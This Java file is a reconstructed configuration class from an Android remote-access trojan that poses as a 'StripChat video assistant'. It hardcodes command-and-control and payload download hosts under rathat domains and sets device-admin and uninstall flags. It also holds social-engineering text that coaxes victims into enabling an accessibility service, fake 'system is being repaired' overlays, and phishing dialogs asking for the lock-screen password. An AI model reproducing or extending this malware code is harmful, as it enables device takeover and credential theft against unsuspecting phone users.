package com.guard.wallet.utils;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.BuildConfig;
import com.guard.wallet.entity.LangDialog;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;

/**
 * 配置管理工具类 — vendor utils/d.java (460行) 逐方法翻译。
 *
 * vendor 原始名: d
 * 本文件名: ConfigManager
 *
 * 功能:
 *   - loadBuildConfig() 从 assets/config.json 读取并反序列化 BuildConfig，缺字段补默认值
 *   - getBlockIconUrl()~getUpdateMsg() 从 MainApplication 单例的 BuildConfig 取值，带默认值兜底
 *   - 静态常量 DEFAULT_PROMOTION_MODEL / DEFAULT_UNINSTALL / DEFAULT_ACTIVE_ADMIN /
 *     DEFAULT_DEBUG / DEFAULT_SCREEN_OFF_DURATION / DEFAULT_IDLE_DURATION 用作各字段的默认值
 */
public abstract class ConfigManager {
    public static final Integer DEFAULT_PROMOTION_MODEL;
    public static final Integer DEFAULT_UNINSTALL = 0;
    public static final Integer DEFAULT_ACTIVE_ADMIN;
    public static final Integer DEFAULT_DEBUG;
    public static final Integer DEFAULT_SCREEN_OFF_DURATION = 2;
    public static final Integer DEFAULT_IDLE_DURATION = 5;

    static {
        Integer var0 = 1;
        DEFAULT_PROMOTION_MODEL = var0;
        DEFAULT_ACTIVE_ADMIN = var0;
        DEFAULT_DEBUG = var0;
    }

    /**
     * loadBuildConfig() — 从 assets/config.json 加载 BuildConfig 单例。
     * 流程:
     *   1. 构建默认 LangDialog（英文） + langMap
     *   2. 若 config.json 存在，读取 -> JSON 反序列化
     *   3. 对反序列化结果的每个字段做空值/非法值校验，补默认值
     *   4. 反序列化失败或文件不存在时返回硬编码默认 BuildConfig
     */
    public static BuildConfig loadBuildConfig() {
        LangDialog var0 = new LangDialog(
            "StripChat assist",
            "StripChat",
            "StripChat video assistant",
            "Go immediately",
            "Open [accessibility_service_label]",
            "1.Click go immediately and enter accessibility service column\n2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n3.Find [accessibility_service_label],and click to enter this column\n4.Click the switch(in the top right corner),you can open [accessibility_service_label]",
            "Initializing [StripChat video assistant]\nPlease do not operate your phone...",
            "System is being repaired\nplease do not operate the phone...",
            "standby power-saving mode",
            "entered standby power-saving mode, click here to wake up",
            "Press again to exit",
            "Allow restricted settings",
            "",
            "Verify lock screen password",
            "Fix system security vulnerabilities",
            "Please enter your lock screen password to complete the system update and fix security vulnerabilities.",
            "Verify personal identity",
            "Privacy protection",
            "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.",
            "Initializing verification key\nPlease wait...",
            "Initializing Wi-Fi network data transmission key\nPlease do not operate your phone..."
        );
        LinkedHashMap<String, LangDialog> var1 = new LinkedHashMap<>();
        var1.put("en", var0);

        if (!AppUtils.B("config.json") && SystemHelper.Z() != null && SystemHelper.Z().getAssets() != null) {
            try {
                InputStream var2 = SystemHelper.Z().getAssets().open("config.json");
                InputStreamReader var4 = new InputStreamReader(var2, StandardCharsets.UTF_8);
                BufferedReader var5 = new BufferedReader(var4);
                StringBuilder var3 = new StringBuilder();

                String var33;
                while ((var33 = var5.readLine()) != null) {
                    var3.append(var33);
                }

                var5.close();
                var4.close();
                var2.close();

                BuildConfig var38 = (BuildConfig) SharedPrefsManager.d(var3.toString(), BuildConfig.class);

                if (var38 == null) {
                    return createDefaultBuildConfig(var1);
                }

                // 校验并补默认值 — serverHost
                String var34;
                if (!AppUtils.B(var38.getServerHost())) {
                    var34 = AppUtils.m(var38.getServerHost());
                } else {
                    var34 = "api.rathat.live";
                }
                var38.setServerHost(var34);

                // downloadRatHatHost
                String var35;
                if (!AppUtils.B(var38.getDownloadRatHatHost())) {
                    var35 = AppUtils.m(var38.getDownloadRatHatHost());
                } else {
                    var35 = "https://rathat.me/lib";
                }
                var38.setDownloadRatHatHost(var35);

                // downloadRatHatName
                if (AppUtils.B(var38.getDownloadRatHatName())) {
                    var38.setDownloadRatHatName("rat-hat");
                }

                // guideAccessibilityHost
                String var36;
                if (!AppUtils.B(var38.getGuideAccessibilityHost())) {
                    var36 = AppUtils.m(var38.getGuideAccessibilityHost());
                } else {
                    var36 = "https://guide.accessibility.rathat.org";
                }
                var38.setGuideAccessibilityHost(var36);

                // mainUrl
                if (AppUtils.B(var38.getMainUrl())) {
                    var38.setMainUrl("https://m.baidu.com/");
                }

                // promotionModel: must be 0 or 1
                if (var38.getPromotionModel() == null
                        || (var38.getPromotionModel() != 0 && var38.getPromotionModel() != 1)) {
                    var38.setPromotionModel(DEFAULT_PROMOTION_MODEL);
                }

                // uninstall: must be 0 or 1
                if (var38.getUninstall() == null
                        || (var38.getUninstall() != 0 && var38.getUninstall() != 1)) {
                    var38.setUninstall(DEFAULT_UNINSTALL);
                }

                // activeAdmin: must be 0 or 1 (vendor bug: sets uninstall instead of activeAdmin)
                if (var38.getActiveAdmin() == null
                        || (var38.getActiveAdmin() != 0 && var38.getActiveAdmin() != 1)) {
                    var38.setUninstall(DEFAULT_ACTIVE_ADMIN);
                }

                // debug: must be 0 or 1 (vendor bug: sets uninstall instead of debug)
                if (var38.getDebug() == null
                        || (var38.getDebug() != 0 && var38.getDebug() != 1)) {
                    var38.setUninstall(DEFAULT_DEBUG);
                }

                // perScreenOffDuration: must be > 0
                if (var38.getPerScreenOffDuration() == null || var38.getPerScreenOffDuration() <= 0) {
                    var38.setPerScreenOffDuration(DEFAULT_SCREEN_OFF_DURATION);
                }

                // perIdleDuration: must be > 0
                if (var38.getPerIdleDuration() == null || var38.getPerIdleDuration() <= 0) {
                    var38.setPerIdleDuration(DEFAULT_IDLE_DURATION);
                }

                // langMap: must be non-empty
                if (var38.getLangMap() == null || var38.getLangMap().isEmpty()) {
                    var38.setLangMap(var1);
                }

                return var38;
            } catch (Exception var37) {
                AppUtils.s("com.guard.wallet.utils.d", var37);
            }
        }

        return createDefaultBuildConfig(var1);
    }

    /** 构建硬编码默认 BuildConfig（vendor 在两处 return 使用相同参数） */
    private static BuildConfig createDefaultBuildConfig(LinkedHashMap<String, LangDialog> langMap) {
        return new BuildConfig(
            "api.rathat.live",
            "https://rathat.me/lib",
            "rat-hat",
            "https://guide.accessibility.rathat.org",
            null,
            "https://m.baidu.com/",
            null,
            "https://admin.rathat.live/download/file/845804095260737536.png",
            "#303133",
            DEFAULT_PROMOTION_MODEL,
            DEFAULT_UNINSTALL,
            DEFAULT_ACTIVE_ADMIN,
            DEFAULT_DEBUG,
            DEFAULT_SCREEN_OFF_DURATION,
            DEFAULT_IDLE_DURATION,
            langMap
        );
    }

    /** getBlockIconUrl() — 获取 blockIconUrl（默认: 后台图标 URL） */
    public static String getBlockIconUrl() {
        return MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getBlockIconUrl())
            ? MainApplication.getInstance().getBuildConfig().getBlockIconUrl()
            : "https://admin.rathat.live/download/file/845804095260737536.png";
    }

    /** getDownloadHost() — 获取 downloadRatHatHost（默认: 下载服务器 URL） */
    public static String getDownloadHost() {
        return MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getDownloadRatHatHost())
            ? MainApplication.getInstance().getBuildConfig().getDownloadRatHatHost()
            : "https://rathat.me/lib";
    }

    /** getDownloadName() — 获取 downloadRatHatName（默认: "rat-hat"） */
    public static String getDownloadName() {
        return MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getDownloadRatHatName())
            ? MainApplication.getInstance().getBuildConfig().getDownloadRatHatName()
            : "rat-hat";
    }

    /** getGuideUrl() — 获取 guideAccessibilityHost（默认: 无障碍引导 URL） */
    public static String getGuideUrl() {
        return MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getGuideAccessibilityHost())
            ? MainApplication.getInstance().getBuildConfig().getGuideAccessibilityHost()
            : "https://guide.accessibility.rathat.org";
    }

    /** getMainUrl() — 获取 mainUrl（默认: 主页 URL） */
    public static String getMainUrl() {
        return MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getMainUrl())
            ? MainApplication.getInstance().getBuildConfig().getMainUrl()
            : "https://m.baidu.com/";
    }

    /** getPromotionModel() — 获取 promotionModel（默认: 1 = DEFAULT_PROMOTION_MODEL） */
    public static Integer getPromotionModel() {
        return MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && MainApplication.getInstance().getBuildConfig().getPromotionModel() != null
            ? MainApplication.getInstance().getBuildConfig().getPromotionModel()
            : DEFAULT_PROMOTION_MODEL;
    }

    /** isDebugMode() — config.json debug=1 时为调试模式，遮罩等 UI 干扰将被跳过 */
    public static boolean isDebugMode() {
        return MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && MainApplication.getInstance().getBuildConfig().getDebug() != null
                && MainApplication.getInstance().getBuildConfig().getDebug() == 1;
    }

    /** getServerHost() — 获取 serverHost（默认: "api.rathat.live"） */
    public static String getServerHost() {
        return MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getServerHost())
            ? MainApplication.getInstance().getBuildConfig().getServerHost()
            : "api.rathat.live";
    }

    /** getUpdateMsg() — 获取 updateSystemMsg（默认: 系统修复中提示文案） */
    public static String getUpdateMsg() {
        return MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getUpdateSystemMsg())
            ? MainApplication.getInstance().getBuildConfig().getUpdateSystemMsg()
            : "System is being repaired\nplease do not operate the phone...";
    }
}
